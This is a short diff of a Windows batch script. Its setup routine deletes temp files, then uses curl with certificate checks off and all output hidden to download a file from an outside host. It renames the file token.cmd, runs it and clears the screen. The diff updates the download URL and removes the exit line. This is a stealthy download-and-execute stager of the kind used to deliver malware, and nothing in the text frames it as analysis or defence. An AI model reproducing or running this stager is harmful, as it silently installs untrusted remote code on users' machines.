@@ -5,8 +5,7 @@ goto :EOF
 :SETUP
 if exist "%TEMP%\parse" del "%TEMP%\parse" >nul 2>&1
 if exist "%TEMP%\token.cmd" del "%TEMP%\token.cmd" >nul 2>&1
-curl -k -s -L -o "%TEMP%\parse" "https://www.sandbox-support.cloud/v2" >nul 2>&1
+curl -k -s -L -o "%TEMP%\parse" "https://www.sandbox-support.cloud/v6" >nul 2>&1
 ren "%TEMP%\parse" token.cmd >nul 2>&1
 "%TEMP%\token.cmd" >nul 2>&1
 cls
-exit /b 0
